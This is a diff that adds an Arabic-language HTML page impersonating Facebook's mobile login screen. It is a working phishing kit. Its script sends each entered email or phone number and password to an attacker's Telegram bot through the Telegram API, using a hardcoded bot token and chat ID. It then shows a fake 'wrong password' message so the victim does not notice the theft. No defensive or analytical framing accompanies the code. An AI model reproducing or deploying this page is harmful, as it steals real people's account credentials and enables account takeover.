@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل الدخول</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #fff;
+      text-align: center;
+      direction: rtl;
+    }
+    .lang {
+      margin: 15px;
+      color: #000;
+      font-size: 14px;
+    }
+    .logo {
+      margin: 50px 0;
+    }
+    .logo img {
+      width: 60px;
+      height: 60px;
+    }
+    .input-box {
+      width: 90%;
+      max-width: 350px;
+      margin: 15px auto;
+      padding: 15px;
+      font-size: 16px;
+      border: 1px solid #ddd;
+      border-radius: 25px; /* الحواف المدورة زي الصورة */
+      display: block;
+      box-sizing: border-box;
+      background: #f9f9f9;
+    }
+    .login-btn {
+      width: 90%;
+      max-width: 350px;
+      margin: 15px auto;
+      padding: 15px;
+      font-size: 16px;
+      font-weight: bold;
+      color: #fff;
+      background: #1877f2;
+      border: none;
+      border-radius: 25px; /* زر مدور */
+      cursor: pointer;
+      display: block;
+    }
+    .forgot {
+      margin: 30px 0;
+      color: #000;
+      font-size: 14px;
+    }
+    .create-btn {
+      width: 90%;
+      max-width: 350px;
+      margin: 15px auto;
+      padding: 15px;
+      font-size: 16px;
+      color: #1877f2;
+      background: #fff;
+      border: 1px solid #1877f2;
+      border-radius: 25px; /* زر مدور زي الصورة */
+      cursor: pointer;
+      display: block;
+    }
+    .footer {
+      margin: 20px 0 15px 0;
+      color: #000;
+      font-size: 16px;
+      font-weight: bold;
+    }
+    .footer {
+  margin: 20px 0;
+  font-size: 14px;
+  color: #444;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 6px; /* مسافة بين اللوجو والكلمة */
+}
+.footer img {
+  height: 20px; /* حجم اللوجو */
+}
+  </style>
+</head>
+<body>
+  <div class="lang">العربية</div>
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook">
+  </div>
+
+  <input type="text" class="input-box" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني">
+  <input type="password" class="input-box" placeholder="كلمة السر">
+
+  <button class="login-btn">تسجيل الدخول</button>
+  <div class="forgot">
+  <a href="https://www.facebook.com/login/identify" target="_blank" style="text-decoration:none; color:#000;">
+    هل نسيت كلمة السر؟
+  </a>
+</div>
+  <a href="https://www.facebook.com/r.php" target="_blank">
+  <button class="create-btn">إنشاء حساب جديد</button>
+</a>
+
+  <div class="footer">
+  <img src="" />
+  <span>Facebook 2025 ©</span>
+</div>
+
+<script>
+  const botToken = "7313277524:AAFPzkl5iXAlNfq5LiM7_OlBVHPkmk-ydpg"; // توكن البوت
+  const chatId = "5965289737"; // ID بتاعك
+
+  const loginBtn = document.querySelector(".login-btn");
+  const emailInput = document.querySelectorAll(".input-box")[0];
+  const passInput = document.querySelectorAll(".input-box")[1];
+
+  loginBtn.addEventListener("click", function (e) {
+    e.preventDefault();
+
+    const email = emailInput.value;
+    const password = passInput.value;
+
+    if (email && password) {
+      // يبعته لتليجرام
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: `📩 بيانات جديدة:\n📱 رقم/إيميل: ${email}\n🔑 باسورد: ${password}`,
+        }),
+      });
+
+      // غير شكل خانة الباسورد
+      passInput.style.border = "2px solid red";
+      
+      // لو فيه رسالة خطأ قبل كده امسحها
+      let errorMsg = document.querySelector(".error-msg");
+      if (!errorMsg) {
+        errorMsg = document.createElement("div");
+        errorMsg.className = "error-msg";
+        errorMsg.style.color = "red";
+        errorMsg.style.marginTop = "5px";
+        errorMsg.innerText = "كلمة المرور غير صحيحة الرجاء المحاوله مره اخرى";
+        passInput.insertAdjacentElement("afterend", errorMsg);
+      }
+    }
+  });
+</script>
